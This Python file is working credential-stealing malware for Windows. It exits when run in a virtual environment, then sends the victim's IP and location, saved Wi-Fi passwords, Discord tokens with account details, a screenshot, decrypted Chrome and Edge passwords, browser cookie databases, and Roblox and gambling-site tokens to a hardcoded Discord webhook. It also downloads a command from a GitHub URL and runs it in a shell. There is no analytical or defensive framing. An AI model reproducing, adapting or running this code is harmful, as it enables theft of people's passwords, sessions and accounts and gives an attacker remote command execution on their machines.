import sys
def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
def invenv(): 
    return get_base_prefix_compat() != sys.prefix
if invenv() == True: sys.exit()
import re, subprocess, requests,os
import getpass;user=getpass.getuser()
hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
class Network:
    def __init__(self):
        self.fiwi()

    def IP(self):
     try:
        reqq = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{reqq['ip']}``"
        try:
            self.hostname = f"``{reqq['hostname']}``"
        except:self.hostname = ":x:"
        self.city = f"``{reqq['city']}``"
        self.region = f"``{reqq['region']}``"
        self.country = f"``{reqq['country']}``"
        self.location = f"``{reqq['loc']}``"
        self.ISP = f"``{reqq['org']}``"
     except:pass

    def fiwi(self):
        self.IP()
        requests.post(hook,json={"content": f"IP : {self.ip}\nHostname: {self.hostname}\nCity: {self.city}\nRegion: {self.region}\nCountry: {self.country}\nLocation: {self.location}\nISP: {self.ISP}"})
        try:
            networks = re.findall(r"(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
                requests.post(hook,json={"content": f"Wifi Network Found : ``{nets}`` \nSSID: ``{ssid}``\nPassword: ``{key}``"})
        except:pass

c = Network()
try:
    import time;from base64 import b64decode;from Crypto.Cipher import AES;from win32crypt import CryptUnprotectData;from os import listdir;from json import loads;from re import findall;from urllib.request import Request, urlopen;import requests;import json
except ImportError as e:
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', e.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        subprocess.run(f"pip install pycryptodome pypiwin32 requests", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
time.sleep(3)
def decrypt(buff, master_key):
    try:return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:return "Error"
def main():
        tokens = [];list2 = [];list3 = [];list4 = [];paths = {'Discord': os.getenv('APPDATA') + r'\\discord','Discord Canary': os.getenv('APPDATA') + r'\\discordcanary','Lightcord': os.getenv('APPDATA') + r'\\Lightcord','Discord PTB': os.getenv('APPDATA') + r'\\discordptb','Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable','Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable','Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data','Torch': os.getenv('LOCALAPPDATA') + r'\\Torch\\User Data','Kometa': os.getenv('LOCALAPPDATA') + r'\\Kometa\\User Data','Orbitum': os.getenv('LOCALAPPDATA') + r'\\Orbitum\\User Data','CentBrowser': os.getenv('LOCALAPPDATA') + r'\\CentBrowser\\User Data','7Star': os.getenv('LOCALAPPDATA') + r'\\7Star\\7Star\\User Data','Sputnik': os.getenv('LOCALAPPDATA') + r'\\Sputnik\\Sputnik\\User Data','Vivaldi': os.getenv('LOCALAPPDATA') + r'\\Vivaldi\\User Data\\Default','Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome SxS\\User Data','Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default','Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\Epic Privacy Browser\\User Data','Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\Microsoft\\Edge\\User Data\\Defaul','Uran': os.getenv('LOCALAPPDATA') + r'\\uCozMedia\\Uran\\User Data\\Default','Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default','Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium': os.getenv('LOCALAPPDATA') + r'\\Iridium\\User Data\\Default'};ip = str(requests.get("http://ipinfo.io/json").json()["ip"])
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                 with open(path + f"\\Local State", "r") as file:key = loads(file.read())['os_crypt']['encrypted_key'];file.close()
            except: continue
            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):tokens.append(values)
                    except PermissionError: continue
            for i in tokens:
                if i.endswith("\\"):i.replace("\\", "")
                elif i not in list2:list2.append(i)
            for token in list2:
                try: tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError == "Error":continue
                list4.append(tok)
                for value in list4:
                    if value not in list3:list3.append(value);headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try: res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:res_json = res.json();pc_username = os.getenv("UserName");pc_name = os.getenv("COMPUTERNAME");user_name = f'{res_json["username"]}#{res_json["discriminator"]}';user_id = res_json['id'];email = res_json['email'];phone = res_json['phone'];mfa_enabled = res_json['mfa_enabled'];res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers);embed = f"""```\nPC_USERNAME: {pc_username}\nPC_NAME: {pc_name}\nUSERNAME: {user_name}\nUSER_ID: {user_id}\nEMAIL: {email}\nPHONE: {phone}MFA: {mfa_enabled}\nTOKEN: {tok}'\nIP: {ip}\nPLATFORM: {platform}```""";payload = json.dumps({'content': embed})
                    try:
                        headers2 = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                        try:
                            req = Request(hook, data=payload.encode(), headers=headers2);res=urlopen(req)
                            if res.getcode() == 200 or 204:return
                            else:continue
                        except:pass
                    except: continue    
                else: continue
main()

def ss():
        import time
        from mss import mss
        envtemp = os.getenv('TEMP')
        temp = os.path.join(envtemp + "\\\\monitor.png")
        with mss() as sct:
            sct.shot(output=temp)
        fpath = envtemp + "\\monitor.png"
        with open(temp, 'rb') as f:
            files = {'file': (fpath, f, 'image/png')}
            requests.post(hook,files=files)
        time.sleep(2)
        os.remove(fpath)
ss()
def shl():
    re = requests.get("https://raw.githubusercontent.com/dd44aa/test/refs/heads/main/file.txt").text
    output = subprocess.run(re, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    requests.post(hook,json={"content": f"```A cmd has been ex3cu1ed```\n{output}"})
shl()

import sqlite3,base64
from Crypto.Cipher import AES
import win32crypt
import shutil
from datetime import datetime, timedelta

def master():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def crypt(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def edgeeq(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = crypt(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: return "Chrome < 80"

def edge():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: shutil.copy2(login_db, "Loginvault.db")
    except: print("Edge browser not detected!")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        result = {}
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = edgeeq(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: pass

    cursor.close(); conn.close()
    try: os.remove("Loginvault.db")
    except Exception as e: print(e); pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def getts():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def main():
    key = getts()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, file_name)
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = {}
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            result[action_url] = [username, password]
        else: continue
    cursor.close(); db.close()
    try: os.remove(file_name)
    except: pass
    return result

def gpsward():
    global file_name, nanoseconds
    file_name, nanoseconds = 116444736000000000, 10000000
    result = {}
    try: result = main()
    except: time.sleep(1)

    try: 
        result2 = edge()
        for i in result2.keys():
            result[i] = result2[i]
    except: time.sleep(1)
    
    return result
requests.post(hook,json={"content": f"{gpsward}"})
import os,re,time
import winreg,requests
class Roblox:

    def __init__(self):
        self.hok = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
        LOCAL = os.getenv('LOCALAPPDATA')
        #os.mkdir(os.path.join(LOCAL, "Roblox"))
        self.robloxfolder = os.path.join(LOCAL, "Roblox")
        if os.path.exists(self.robloxfolder):
         try:
            self.Rblxwild_file=open(self.robloxfolder+"\\Rblxwild_Tokens.txt","w+")
            self.Rblxroll_file=open(self.robloxfolder+"\\Rblxroll_Tokens.txt","w+")
            self.Betbux_file=open(self.robloxfolder+"\\Betbux_Tokens.txt","w+")
            self.Rbxflip_file=open(self.robloxfolder+"\\Rbxflip_Tokens.txt","w+")
            self.Bloxflip_file=open(self.robloxfolder+"\\Bloxflip_Tokens.txt","w+")
            self.bloxflip = 0
            self.cookroblo = 0
            self.rbxflip = 0
            self.rblxwild = 0
            self.betbux = 0
            self.rblxroll = 0
            self.content = """
``|_`` :open_file_folder: ``Roblox``"""
            self.paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
            self.profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            self.RobloxStudio()
            for pvth in self.paths:
                if "Opera Software" in pvth:
                    try:
                        self.Rblxwild(os.path.join(pvth, "Local Storage", "leveldb"))
                    except:
                        pass
                else:
                    for prof in self.profs:
                        try:
                            self.Rblxwild(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                        except:
                            pass
            for pvth in self.paths:
                if "Opera Software" in pvth:
                  try:
                     self.Rbxflip(os.path.join(pvth, "Local Storage", "leveldb"))
                  except:pass
                else:
                    for prof in self.profs:
                        try:
                            self.Rbxflip(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                        except:
                            pass
            for pvth in self.paths:
             if "Opera Software" in pvth:
                 try:
                     self.Bloxflip(os.path.join(pvth, "Local Storage", "leveldb"))
                 except:
                     pass
             else:
                 for prof in self.profs:
                     try:
                         self.Bloxflip(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                     except:
                         pass
            for pvth in self.paths:
             if "Opera Software" in pvth:
                 try:
                     self.Betbux(os.path.join(pvth, "Local Storage", "leveldb"))
                 except:
                     pass
             else:
                 for prof in self.profs:
                     try:
                         self.Betbux(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                     except:
                         pass
            for pvth in self.paths:
             if "Opera Software" in pvth:
                 try:
                     self.Rblxroll(os.path.join(pvth, "Local Storage", "leveldb"))
                 except:
                    pass
            else:
                for prof in self.profs:
                    try:
                        self.Rblxroll(os.path.join(pvth,prof, "Local Storage", "leveldb"))
                    except:
                        pass
            if self.cookroblo > 0:
                self.content += f"""
``|   |_``:page_facing_up: ``({self.cookroblo}) Roblox_Cookies``"""
            if self.bloxflip > 0:
                self.content += f"""
``|   |_``:page_facing_up: ``({self.bloxflip}) Bloxflip_Tokens``"""
            if self.rbxflip >0:
                self.content += f"""
``|   |_``:page_facing_up: ``({self.rbxflip}) Rbxflip_Tokens``"""
            if self.rblxwild > 0:
             self.content += f"""
``|   |_``:page_facing_up: ``({self.rblxwild}) Rblxwild_Tokens``"""
            if self.betbux >0:
                self.content += f"""
``|   |_``:page_facing_up: ``({self.betbux}) Betbux_Tokens``"""
            if self.rblxroll >0:
                self.content += f"""
``|   |_``:page_facing_up: ``({self.rblxroll}) Rblxroll_Tokens``"""
            if self.bloxflip+self.cookroblo+self.rbxflip+self.rblxwild+self.betbux+self.rblxroll == 0:
                self.content += f"""
``|   |_``:x: ``No Roblox Data Found``"""
            self.Rblxwild_file.close()
            self.Rblxroll_file.close()
            self.Betbux_file.close()
            self.Rbxflip_file.close()
            self.Bloxflip_file.close()
            self.upload()
         except:pass
        else:pass

    def Rblxroll(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = open(pvth+"\\"+f,'r',errors="ignore").read()
                        if "https://www.rblxroll.com" in str(file) or "https://rblxroll.com" in str(file) or "rblxroll.com" in str(file):
                            rblxrollsplit = file.split("rblxroll.com")
                            for tokens in rblxrollsplit:
                                try:
                                    tok = tokens.split("token")[1]
                                    t=str(re.findall(r"[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\b",tok)[0])
                                    if len(t) > 100:
                                        self.rblxroll += 1
                                        self.Rblxroll_file.write(f"\n(Local Storage) token : {t}\n\n"+"-"*35)
                                except:
                                    pass
                    except:     
                        pass
        except:
            pass

    def Betbux(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = open(pvth+"\\"+f,'r',errors="ignore").read()
                        if "https://www.betbux.gg" in str(file) or "https://betbux.gg" in str(file) or "betbux.gg" in str(file):
                            betbuxsplit = file.split("betbux.com")
                            for tokens in betbuxsplit:
                                try:
                                    t="DO_NO_SHARE_THIS_|"+str(re.findall(r"(?<=DO_NO_SHARE_THIS_\|)\b[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\b",tokens)[0])
                                    if len(t) > 100:
                                        self.Betbux_file.write(f"\n(Local Storage) betbux_cookie : {t}\n\n"+"-"*35)
                                        self.betbux += 1
                                except:
                                    pass
                    except:
                        pass
        except:
            pass

    def Rblxwild(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = str(open(pvth+"\\"+f,"rb").read().strip())
                        file = file.split("_https://rblxwild.com")
                        for tok in file:
                            t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                            if len(t)>50:
                                self.rblxwild += 1
                                self.Rblxwild_file.write(f"\n(Local Storage) authToken : {t}\n\n"+"-"*35)
                    except:
                        pass
        except:pass

    def Rbxflip(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = str(open(pvth+"\\"+f,"rb").read().strip())
                        if "https://www.rbxflip.com" in file or "https://rbxflip.com" in file or "rbxflip.com" in file:
                            try:
                                file2 = file.split("rbxflip.com")
                                for tok in file2:
                                    try:
                                        t="eyJhbGciOiJIUzI1NiJ9."+str(re.findall(r'\b[A-Za-z0-9_-]{2000,2300}\b\.[A-Za-z0-9_-]+',tok)[0])
                                        if len(t) > 2000:
                                            self.rbxflip += 1
                                            self.Rbxflip_file.write(f"\n(Local Storage) accessToken : {t}\n\n"+"-"*35)
                                    except:
                                        pass
                            except:
                                pass
                    except:
                        pass
        except:pass

    def Bloxflip(self,pvth):
        try:
            for f in os.listdir(pvth):
                if f.endswith(".log") or f.endswith(".ldb"):
                    try:
                        file = str(open(pvth+"\\"+f,"rb").read().strip())
                        file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                        for tok in file2:
                            try:
                                t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                self.bloxflip += 1
                                self.Bloxflip_file.write(f"\n(Local Storage) _DO_NOT_SHARE_BLOXFLIP_TOKEN : {t}\n\n"+"-"*35)
                            except:
                                pass
                    except:
                        pass
        except:pass

    def RobloxStudio(self):
        try:
            filo=open(self.robloxfolder+"\\Roblox_Cookies.txt","w+")
        except:pass
        try:
            robloxstudiopath = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value = winreg.EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
                    self.cookroblo += 1
                    filo.write(f"\n(Cookies) .ROBLOSECURITY : {value}\n\n"+"-"*35)
                count = count + 1
        except WindowsError:
            pass
        try:
            filo.close()
        except:pass
        try:
            requests.post(self.hok, files=filo)
        except:pass
    
    def __repr__(self):
        return self.content
    
    def upload(self):
        roblo = self.cookroblo
        cont = self.content
        wild = self.Rblxwild_file
        roll = self.Rblxroll_file
        bet = self.Betbux_file
        flip = self.Rbxflip_file
        fblox = self.Bloxflip_file
        temp = os.getenv("TEMP")
        path = temp + "\\zt423f362.txt"
        with open(path,'x') as x:
            x.write(f"{roblo}\n{cont}\n{wild}\n{roll}\n{bet}\n{flip}\n{fblox}")
            x.close()
            with open(path, 'rb') as f:
                ff = {"file": (f)}
                hok = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
                requests.post(hok,files=ff)
        time.sleep(2)
        os.remove(path=path)

k = Roblox()
user = os.getlogin()
zce = f"C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
for folder in os.listdir(zce):
    if re.search(r'release', folder, re.IGNORECASE):
        defualtt = os.path.join(zce, folder)
else:
    pass
flis = [
    f"{defualtt}\\cookies.sqlite",
    f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
    f"C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies",
    f"C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Default\\Network\\Cookies"]

for fpath in flis:
    if os.path.exists(fpath):
            with open(fpath, 'rb') as file:
                nam = fpath.split('/')[-1] 
                files = {'file': (nam, file) }
                try:
                    requests.post(hook, files=files)
                except:pass
    else:continue

def gcc(db=None):
    import json,sqlite3
    from base64 import b64decode
    from win32.win32crypt import CryptUnprotectData 
    from Cryptodome.Cipher.AES import new, MODE_GCM 
    try:
        if db is None:
            from os.path import expandvars
            db = expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Cookies')
        with open(db + '/../../Local State') as f:
            key = CryptUnprotectData(b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:])[1]

        conn = sqlite3.connect(db)
        conn.create_function('decrypt', 1, lambda v: new(key, MODE_GCM, v[3:15]).decrypt(v[15:-16]).decode())
        cookies = dict(conn.execute("SELECT name, decrypt(encrypted_value) FROM cookies"))
        conn.close()
        requests.post(hook,json={"content": f"{cookies}"})
    except:
        pass
gcc()
